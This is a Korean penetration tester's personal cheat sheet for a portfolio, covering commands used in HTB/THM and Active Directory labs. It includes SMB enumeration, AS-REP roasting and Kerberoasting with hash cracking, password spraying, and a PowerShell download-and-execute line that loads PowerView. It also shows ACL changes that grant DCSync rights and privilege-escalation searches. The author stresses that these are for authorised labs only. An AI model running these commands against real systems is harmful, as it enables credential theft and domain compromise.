# 실전 사용 치트시트

이 문서는 내가 지금까지 노션에 모아둔 개인 치트시트를 포트폴리오용으로 정리한 것이다. HTB/THM, 웹 해킹 실습, AD 실습, 시스템 해킹 복습을 하면서 실제로 자주 사용했거나 헷갈려서 다시 적어둔 명령어를 기준으로 구성했다.

정리 기준은 다음과 같다.

- 실습 중 자주 막힌 포인트
- 바로 복습할 수 있는 명령어
- 왜 쓰는지
- 사용할 때 조심할 점

실제 노션에는 실습 당시의 IP, 계정명, 임시 비밀번호 메모도 있었지만, 포트폴리오에는 모두 `IP`, `DOMAIN`, `USER`, `PASS` 형태로 익명화했다.

---

## 1. 터미널 / 셸 습관

### 특수문자 비밀번호

```bash
smbmap -H IP -u USER -p 'PASS_WITH_?'
smbclient '//IP/SHARE' -U 'USER%PASS_WITH_?'
```

왜 쓰는지:

- 비밀번호 안의 `?`, `*`, `!`, `$`, `&`, 공백은 셸이 먼저 해석할 수 있다.
- 작은따옴표로 감싸면 비밀번호를 문자 그대로 전달할 수 있다.

주의점:

- 인증 실패가 나면 도구 문제보다 오타, 따옴표, 도메인 형식을 먼저 확인한다.

### 자주 쓰는 단축키

| 단축키 | 용도 |
| --- | --- |
| `Ctrl + u` | 현재 입력 줄 전체 삭제 |
| `Ctrl + l` | 터미널 화면 정리 |
| `Ctrl + z` | 현재 작업 일시 중지 |
| `bg` | 백그라운드 실행 |
| `fg` | 포그라운드 복귀 |

---

## 2. 출력 정리

### nmap 포트 목록 만들기

```bash
cat fullTcp.nmap | grep -i '/' | cut -d '/' -f 1 | paste -sd, -
```

왜 쓰는지:

- 전체 포트 스캔 결과에서 포트 번호만 추출해 상세 스캔의 `-p` 옵션에 넣는다.

### grep 제외 검색

```bash
grep -vi 'image\|manager' rawuserlist.txt > output.txt
```

왜 쓰는지:

- 사용자 후보 목록에서 직무명, 이미지 계정, 불필요한 단어가 들어간 줄을 제외한다.

### sed / tr

```bash
sed -E '/admin|test|guest/d' file.txt
sed -E 's/admin|test|guest//g' file.txt
tr -s ' '
cat file.txt | tr ',' '\n'
```

주의점:

- 줄 자체를 삭제하려면 `/패턴/d`
- 문자열만 제거하거나 바꾸려면 `s/패턴/대체/g`
- `tr`은 문자 단위 변환 도구라 문자열 치환과는 다르다.

---

## 3. 셸 안정화 / 파일 전달

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -m http.server 8000
python3 -m venv .venv
```

왜 쓰는지:

- 리버스 셸이 불안정할 때 pseudo-terminal을 띄운다.
- 파일을 간단히 전달할 때 Python HTTP 서버를 사용한다.
- Python 도구 설치가 꼬이면 가상환경을 분리한다.

주의점:

- 대상 시스템에 Python이 없을 수 있으므로 `python`, `python3`, `script`, `sh` 대안을 확인한다.

---

## 4. SMB / 파일 공유

### smbmap

```bash
smbmap -H IP
smbmap -H IP -u USER -p PASS -d DOMAIN
smbmap -H IP -u USER -p PASS -r SHARE
smbmap -H IP -u USER -p PASS -R SHARE
smbmap -H IP -u USER -p PASS --download 'SHARE/path/file.txt'
smbmap -H IP -u USER -p PASS --upload local.txt 'SHARE/path/local.txt'
```

왜 쓰는지:

- SMB 공유 목록과 권한을 빠르게 확인한다.
- 읽기 가능한 공유 안에서 문서, 백업, 인증서, 스크립트 파일을 찾는다.

### smbclient

```bash
smbclient '//IP/SHARE' -U 'USER%PASS'

ls
cd folder
get file.txt
put local.txt
recurse ON
prompt OFF
mget *
```

주의점:

- 공유 이름 끝의 `$`는 셸에서 변수처럼 해석될 수 있으므로 따옴표를 사용한다.
- 단일 파일은 `get`, 여러 파일은 `mget`을 사용한다.

---

## 5. Windows AD / Kerberos

### AS-REP Roasting

```bash
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip IP -outputfile asreproast.hash
hashcat -m 18200 -a 0 asreproast.hash /usr/share/wordlists/rockyou.txt
```

왜 쓰는지:

- Kerberos 사전 인증이 꺼진 계정의 AS-REP 해시를 수집하고 크랙한다.

### Kerberoasting

```bash
impacket-GetUserSPNs 'DOMAIN/USER:PASS' -dc-ip IP -outputfile kerberoast.hash
```

왜 쓰는지:

- SPN이 걸린 서비스 계정의 TGS 해시를 수집한다.

### Kerbrute

```bash
kerbrute userenum --dc IP -d DOMAIN users.txt
kerbrute passwordspray --dc IP -d DOMAIN users.txt PASSWORD
```

주의점:

- password spray는 계정 잠금 정책을 고려해야 한다.
- CTF/랩 외 환경에서는 실행하지 않는다.

---

## 6. PowerView / BloodHound

### PowerView 로드

```powershell
iex(new-object net.webclient).downloadstring('http://IP:PORT/powerview.ps1')
```

왜 쓰는지:

- AD 사용자, 그룹, ACL, 세션 정보를 PowerShell에서 확인한다.

### 그룹/ACL 흐름

```powershell
Add-DomainGroupMember -Identity 'GROUP_NAME' -Members USER
$pass = ConvertTo-SecureString 'PASS' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('USER@DOMAIN', $pass)
Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity USER -TargetIdentity 'TARGET' -Rights DCSync
```

주의점:

- AD ACL 수정은 고위험 작업이다.
- 포트폴리오에서는 권한 경로 이해와 실습 재현 흐름으로만 설명한다.

### BloodHound

```bash
bloodhound-python -u USER -p PASS -d DOMAIN -c All -dc DC_HOST -ns DNS_IP --zip
sudo neo4j start
```

왜 쓰는지:

- 사용자, 그룹, 세션, ACL 관계를 그래프로 보고 공격 경로를 찾는다.

---

## 7. Linux 권한 상승

### SUID 파일 찾기

```bash
find / -type f -perm -04000 2>/dev/null | xargs ls -alh
```

왜 쓰는지:

- SUID가 걸린 바이너리 중 권한 상승에 악용 가능한 항목을 찾는다.

### 열린 포트 / 프로세스

```bash
ss -tulpn
df -h
top
htop
jobs
```

주의점:

- 내부에서만 열려 있는 포트는 포트포워딩이나 로컬 접근 단서가 될 수 있다.
- `ss -tulpn`은 “열린 포트 + 프로세스”를 같이 볼 때 사용한다.

---

## 8. Vim / Tmux

### Vim

| 키 | 용도 |
| --- | --- |
| `yy`, `p` | 한 줄 복사 / 붙여넣기 |
| `v`, `Shift+v` | 선택 / 줄 선택 |
| `u`, `Ctrl+r` | 되돌리기 / 다시 실행 |
| `0`, `^`, `w`, `b`, `e` | 줄/단어 이동 |
| `gg`, `dG` | 맨 위 이동 / 현재 줄부터 끝까지 삭제 |
| `:set number` | 줄 번호 표시 |

### Tmux

```bash
tmux ls
tmux list-panes -a
tmux join-pane -h -s :1.0
tmux join-pane -v -s htb:1.0 -t main:0.0
tmux set -g mouse on
```

| 단축키 | 용도 |
| --- | --- |
| `Ctrl+b z` | pane 확대/복귀 |
| `Ctrl+b x` | 현재 pane 종료 |
| `Ctrl+b !` | 현재 pane을 새 window로 분리 |

암기 포인트:

- `-s`는 source, `-t`는 target
- 같은 세션이면 `:1.0`, 다른 세션이면 `session:window.pane`

---

## 9. Pwn / Exploit 개발

```bash
pip3 install pwntools
pwn cyclic 200
pwn cyclic -l VALUE
readelf -s ./binary
dmesg
searchsploit -p linux/remote/ID.py
searchsploit -m linux/remote/ID.py
```

왜 쓰는지:

- `cyclic`: BOF 오프셋 계산
- `readelf -s`: 심볼 확인
- `searchsploit`: 공개 PoC 경로 확인 또는 복사

주의점:

- 공개 PoC는 그대로 실행하지 않고, 코드가 무엇을 하는지 먼저 읽는다.
- 실습 보고서에는 payload보다 취약 원인과 재현 흐름을 명확히 남긴다.

---

## 10. 개인 사용 기준

```text
1. 대상이 허가된 실습 환경인지 확인
2. 실제 IP/계정/비밀번호는 기록 시 익명화
3. 명령어만 남기지 말고 왜 썼는지 같이 기록
4. 실패한 이유와 수정한 명령어도 남기기
5. 포폴에는 공격 결과보다 분석 흐름과 대응 관점을 강조
```
